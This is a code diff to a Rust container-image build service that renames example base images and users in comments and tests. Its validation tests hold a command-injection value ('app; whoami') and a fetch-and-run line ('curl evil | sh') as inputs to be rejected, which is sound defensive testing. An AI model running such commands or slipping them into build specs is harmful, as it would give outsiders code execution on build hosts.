@@ -132,7 +132,7 @@ pub struct PackageGroup {
 /// it, a whole `dockerfile` the server only checks and stamps.
 #[derive(Debug, Clone, Default, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
 pub struct ImageBuildSpec {
-    /// The image to build on (`rayproject/ray:2.56.0`); must match the
+    /// The image to build on (`python:3.12-slim`); must match the
     /// administrator's base allowlist when one is configured. Ignored when
     /// `dockerfile` is set (its FROM lines are checked instead).
     #[serde(default)]
@@ -156,7 +156,7 @@ pub struct ImageBuildSpec {
     /// OCI labels baked into the image.
     #[serde(default)]
     pub labels: BTreeMap<String, String>,
-    /// The user the image runs as (`ray`, `1000`, `1000:100`). Required
+    /// The user the image runs as (`app`, `1000`, `1000:100`). Required
     /// when any system package group is present (they install as root).
     #[serde(default)]
     pub user: Option<String>,
@@ -385,7 +385,7 @@ fn user_re() -> &'static Regex {
         r"^[A-Za-z_][A-Za-z0-9_-]*(?::[A-Za-z0-9_-]+)?$|^[0-9]+(?::[0-9]+)?$",
     )
 }
-/// A repository path component (`ray/team`), as the distribution spec allows.
+/// A repository path component (`team/app`), as the distribution spec allows.
 pub fn image_name_re() -> &'static Regex {
     re(
         &NAME_RE,
@@ -744,7 +744,7 @@ pub fn render_containerfile_with(spec: &ImageBuildSpec, pip_index_url: Option<&s
     out.push_str("# Do not edit: change the spec and rebuild.\n");
     if multistage {
         // The builder stage is discarded, so it always runs as root: bases
-        // that run as a non-root user (rayproject/ray runs as `ray`) cannot
+        // that run as a non-root user cannot
         // create the stage target otherwise, and the final stage copies the
         // result in as root before switching to the spec's user.
         out.push_str(&format!("FROM {} AS builder\nUSER root\n", base));
@@ -1259,7 +1259,7 @@ mod tests {
             buildctl_path: "buildctl".into(),
             push_registry: Some("registry:8080".into()),
             registry_insecure: true,
-            base_allowlist: vec!["rayproject/".into(), "registry:8080/".into()],
+            base_allowlist: vec!["python:".into(), "registry:8080/".into()],
             allow_run: false,
             allow_dockerfile: false,
             timeout: Duration::from_secs(60),
@@ -1271,7 +1271,7 @@ mod tests {
 
     fn spec() -> ImageBuildSpec {
         ImageBuildSpec {
-            base_image: "rayproject/ray:2.56.0".into(),
+            base_image: "python:3.12-slim".into(),
             apt: vec!["libgomp1".into()],
             conda: vec!["samtools=1.20".into()],
             conda_channels: vec!["bioconda".into(), "conda-forge".into()],
@@ -1281,8 +1281,8 @@ mod tests {
                 ("GREETING".into(), "say \"hi\" $USER".into()),
             ]),
             labels: BTreeMap::from([("team".into(), "a".into())]),
-            user: Some("ray".into()),
-            workdir: Some("/home/ray".into()),
+            user: Some("app".into()),
+            workdir: Some("/home/app".into()),
             run: vec![],
             ..Default::default()
         }
@@ -1428,18 +1428,18 @@ USER root
     #[test]
     fn dockerfile_override_is_gated_checked_and_stamped() {
         let st = settings();
-        let df = "FROM rayproject/ray:2.56.0 AS build
+        let df = "FROM python:3.12-slim AS build
 RUN pip install x
 
 FROM scratch
 COPY --from=build /a /a
-FROM rayproject/ray:2.56.0
+FROM python:3.12-slim
 ";
         assert_eq!(
             dockerfile_base_images(df),
             vec![
-                "rayproject/ray:2.56.0".to_string(),
-                "rayproject/ray:2.56.0".to_string()
+                "python:3.12-slim".to_string(),
+                "python:3.12-slim".to_string()
             ]
         );
         let s = ImageBuildSpec {
@@ -1570,7 +1570,7 @@ FROM rayproject/ray:2.56.0
             ("AK_IMAGE_BUILD_REGISTRY_INSECURE", None),
             (
                 "AK_IMAGE_BUILD_BASE_ALLOWLIST",
-                Some(" rayproject/ , ,python: "),
+                Some(" debian: , ,python: "),
             ),
             ("AK_IMAGE_BUILD_ALLOW_RUN", Some("yes")),
             ("AK_IMAGE_BUILD_ALLOW_DOCKERFILE", Some("TRUE")),
@@ -1590,7 +1590,7 @@ FROM rayproject/ray:2.56.0
         assert!(s.enabled());
         assert_eq!(s.push_registry.as_deref(), Some("reg.svc:8080"));
         assert!(s.registry_insecure, "http:// implies insecure");
-        assert_eq!(s.base_allowlist, vec!["rayproject/", "python:"]);
+        assert_eq!(s.base_allowlist, vec!["debian:", "python:"]);
         assert!(s.allow_run && s.allow_dockerfile && !s.admin_only);
         assert_eq!(s.timeout, Duration::from_secs(90));
         assert_eq!(s.max_concurrent, 2, "0 falls back to the default");
@@ -1615,7 +1615,7 @@ FROM rayproject/ray:2.56.0
         let b = render_containerfile(&s);
         assert_eq!(a, b);
         assert!(a.starts_with("# syntax=docker/dockerfile:1\n"));
-        assert!(a.contains("FROM rayproject/ray:2.56.0\n"));
+        assert!(a.contains("FROM python:3.12-slim\n"));
         assert!(a.contains("USER root\nRUN apt-get update"));
         assert!(a.contains("'libgomp1'"));
         assert!(a.contains("RUN conda install -y -c 'bioconda' -c 'conda-forge'"));
@@ -1624,7 +1624,7 @@ FROM rayproject/ray:2.56.0
         assert!(a.contains("ENV OMP_NUM_THREADS=\"1\"\n"));
         assert!(a.contains("LABEL \"team\"=\"a\"\n"));
         assert!(a.contains(&format!("LABEL \"{SPEC_LABEL}\"=")));
-        assert!(a.ends_with("WORKDIR /home/ray\nUSER ray\n"));
+        assert!(a.ends_with("WORKDIR /home/app\nUSER app\n"));
         // Only the spec label rides an otherwise-empty spec.
         let minimal = render_containerfile(&ImageBuildSpec {
             base_image: "python:3.12-slim".into(),
@@ -1670,7 +1670,7 @@ FROM rayproject/ray:2.56.0
             s.labels.insert(SPEC_LABEL.into(), "x".into());
         })
         .contains("reserved"));
-        assert!(bad(|s| s.user = Some("ray; whoami".into())).contains("user"));
+        assert!(bad(|s| s.user = Some("app; whoami".into())).contains("user"));
         assert!(bad(|s| s.workdir = Some("relative".into())).contains("workdir"));
         assert!(bad(|s| s.user = None).contains("system packages install as root"));
         assert!(bad(|s| s.run = vec!["curl evil | sh".into()]).contains("not enabled"));
@@ -1688,15 +1688,15 @@ FROM rayproject/ray:2.56.0
 
     #[test]
     fn names_tags_and_push_plumbing() {
-        assert!(image_name_re().is_match("ray/team"));
+        assert!(image_name_re().is_match("images/team"));
         assert!(image_name_re().is_match("spike"));
-        assert!(!image_name_re().is_match("Ray"));
+        assert!(!image_name_re().is_match("Images"));
         assert!(!image_name_re().is_match("a//b"));
         assert!(tag_re().is_match("2.56.0-py312"));
         assert!(!tag_re().is_match("bad tag"));
         assert_eq!(
-            push_reference("reg:8080", "ray", "team", "1.0"),
-            "reg:8080/ray/team:1.0"
+            push_reference("reg:8080", "images", "team", "1.0"),
+            "reg:8080/images/team:1.0"
         );
         let cfg: serde_json::Value =
             serde_json::from_str(&docker_config_json("reg:8080", "alice", "tok")).unwrap();
@@ -1707,7 +1707,7 @@ FROM rayproject/ray:2.56.0
                 .unwrap(),
             b"alice:tok"
         );
-        let args = buildctl_args(&settings(), "/tmp/ctx", "reg:8080/ray/team:1.0");
+        let args = buildctl_args(&settings(), "/tmp/ctx", "reg:8080/images/team:1.0");
         assert_eq!(args[0], "--addr");
         assert!(args.contains(&"attest:provenance=mode=max".to_string()));
         assert!(args.last().unwrap().contains("registry.insecure=true"));
